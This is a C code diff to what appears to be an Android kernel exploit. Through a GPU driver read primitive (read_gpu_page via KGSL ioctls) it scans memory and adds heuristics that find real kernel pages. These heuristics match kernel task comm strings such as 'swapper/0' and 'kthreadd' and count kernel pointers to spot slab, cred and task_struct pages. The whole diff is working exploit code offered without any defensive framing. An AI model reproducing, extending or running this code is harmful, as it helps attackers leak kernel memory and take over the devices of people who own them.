@@ -384,8 +384,13 @@ int main(int argc, char **argv) {
             fprintf(stderr, "[SCAN] start=%lx end=%lx total=%lu pages\n",
                     (unsigned long)start, (unsigned long)end, (unsigned long)(total / PAGE_SIZE));
             fflush(stderr);
-            // Scan with step 4 pages (SCAN_PAGE_STEP=4 from v6.c) for speed
-            for (uint64_t va = start; va < end; va += PAGE_SIZE * 4) {
+            // Scan with step 2 pages (SCAN_PAGE_STEP=2) for denser coverage
+            // and faster offset discovery. The KGSL read cost is dominated
+            // by the GPU round-trip (usleep+ioctl), so reading every 2
+            // pages (vs every 4) doubles our hit rate at 2x read cost —
+            // net win because real interesting pages are sparse and we
+            // want to find them quickly.
+            for (uint64_t va = start; va < end; va += PAGE_SIZE * 2) {
                 if (read_gpu_page(va, buf) == 0) {
                     int found_sig = 0;
                     int found_off = -1;
@@ -401,6 +406,45 @@ int main(int argc, char **argv) {
                     if (!found_sig) {
                         p = memmem(buf, PAGE_SIZE, "com.android.", 11);
                         if (p) { found_sig = 2; found_off = (int)((uint8_t*)p - buf); }
+                    }
+                    // 2b. Linux kernel process comm strings (real kernel memory)
+                    //     init_task.comm = "swapper/0\0\0\0\0\0\0\0" (PID 0)
+                    //     PID 2 = "kthreadd\0\0\0\0\0\0\0\0\0"
+                    //     PID 1 = "init\0\0\0\0\0\0\0\0\0\0\0\0\0"
+                    //     workers: "kworker/0:0\0\0", "ksoftirqd/0\0\0\0", etc.
+                    if (!found_sig) {
+                        static const char *kernel_comms[] = {
+                            "swapper/0", "swapper/1", "swapper/2", "swapper/3",
+                            "kthreadd", "init", "kworker/", "migration/",
+                            "ksoftirqd/", "rcu_sched", "rcu_bh", "rcu_preempt",
+                            "kdevtmpfs", "oom_reaper", "writeback", "kcompactd",
+                            "crypto", "watchdog/", "cpuhp/", "kblockd",
+                            "systemd", "systemd-journal", "systemd-udevd",
+                            "jbd2/", "ext4-rsv-con", "nfsiod", "nfsv4.1-svc",
+                            "kswapd", "khvcd", "kthrotld", "irq/", "scsi_",
+                            "fsnotify_mark", "xfsall", "xfs_mru_cache",
+                            "xfs-buf/", "xfs-conv/", "xfs-cil/", "xfs-reclaim/",
+                            "xfs-log/", "xfs-eofblocks/", "ipv6_addrconf",
+                        };
+                        for (size_t kc = 0; kc < sizeof(kernel_comms)/sizeof(kernel_comms[0]); kc++) {
+                            int klen = (int)strlen(kernel_comms[kc]);
+                            // Need a NUL terminator within next 16 bytes (comm is 16 bytes)
+                            void *q = memmem(buf, PAGE_SIZE - 16, kernel_comms[kc], klen);
+                            if (q) {
+                                // Verify: NUL within 16 bytes AND no non-printable bytes
+                                // in [klen..16) range (comm should be 16 bytes total)
+                                int ok = 1;
+                                for (int j = klen; j < 16; j++) {
+                                    uint8_t cj = ((uint8_t*)q)[j];
+                                    if (cj != 0) { ok = 0; break; }
+                                }
+                                if (ok) {
+                                    found_sig = 10;
+                                    found_off = (int)((uint8_t*)q - buf);
+                                    break;
+                                }
+                            }
+                        }
                     }
                     // 3. Kernel ELF header (kernel base)
                     if (!found_sig) {
@@ -508,6 +552,55 @@ int main(int argc, char **argv) {
                                     break;
                                 }
                             }
+                        }
+                    }
+                    // 10 (was 2b). Handled above as sig 10 - real kernel comm strings.
+                    // 11. Heap density — page is full of kernel pointers
+                    //     (typical slab/cred/task_struct pages have many
+                    //     pointer-sized kernel VAs). Count 0xffffff... pointers
+                    //     in the page. >= 8 is a strong "real kernel heap page"
+                    //     signal — the alternative is a sparse all-zero page.
+                    if (!found_sig) {
+                        int kptrs = 0;
+                        int nonzero_bytes = 0;
+                        for (int i = 0; i + 8 <= PAGE_SIZE; i += 8) {
+                            uint64_t v;
+                            memcpy(&v, buf + i, 8);
+                            if ((v >> 32) >= 0xffffff80 &&
+                                (v >> 40) <= 0xffffffcf && v != 0) {
+                                kptrs++;
+                            }
+                            // Also count nonzero bytes for density check
+                            for (int j = 0; j < 8; j++) {
+                                if (buf[i + j] != 0) nonzero_bytes++;
+                            }
+                        }
+                        // Real kernel data page: >= 8 kernel pointers AND >= 30% non-zero
+                        if (kptrs >= 8 && nonzero_bytes >= 1228) {
+                            found_sig = 11;
+                            found_off = 0;
+                        }
+                    }
+                    // 12. Sparse-but-real — page has a few kernel pointers and
+                    //     moderate density (e.g. /sys/* or kallsyms entries
+                    //     with strings). >= 3 kernel pointers and >= 16% non-zero.
+                    if (!found_sig) {
+                        int kptrs = 0;
+                        int nonzero_bytes = 0;
+                        for (int i = 0; i + 8 <= PAGE_SIZE; i += 8) {
+                            uint64_t v;
+                            memcpy(&v, buf + i, 8);
+                            if ((v >> 32) >= 0xffffff80 &&
+                                (v >> 40) <= 0xffffffcf && v != 0) {
+                                kptrs++;
+                            }
+                            for (int j = 0; j < 8; j++) {
+                                if (buf[i + j] != 0) nonzero_bytes++;
+                            }
+                        }
+                        if (kptrs >= 3 && nonzero_bytes >= 600) {
+                            found_sig = 12;
+                            found_off = 0;
                         }
                     }
 
